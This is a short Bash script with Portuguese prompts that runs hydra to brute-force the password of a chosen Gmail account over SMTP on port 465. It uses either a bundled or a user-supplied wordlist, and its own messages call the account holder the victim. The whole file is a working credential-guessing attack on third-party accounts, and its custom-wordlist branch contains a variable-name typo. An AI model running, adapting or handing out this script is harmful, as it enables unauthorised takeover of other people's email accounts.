#!/bin/bash

clear
echo "⚠ Leia com Atenção ⚠ "
echo "por equanto essa brute force só funciona em emails do google (gmail)"
echo "essa brute force não é 100% eficaz"
echo "e a vitima pode ser alertada durante a brute force"
echo "em alguns causos o dispositivo da vitima pode travar por alguns instantes"
echo " "
read -p "aperte {Enter} para continuar"

clear

figlet brute_gmail

read -p "Digite o email: " email
echo "S/N"
echo "Deseja usar uma wordlist padrão? "
read -p ">> " escolha
case "$escolha" in
	S)
		read -p "Aperte {Enter} para começar a brute force"
		hydra smtp.gmail.com smtp -l $email -P requisitos/passwords.txt -s 465 -S -v -V -t 16

	;;

	N)
		echo "coloque o caminho da wordlist que você quer usar"
		read -p "caminho da wordlist: " wordlist
		read -p "aperte {Enter} para começar a brute force"
		hydra smtp.gmail.com smtp -l $email -P $worlist -s 465 -S -v -V -t 16
	;;

esac
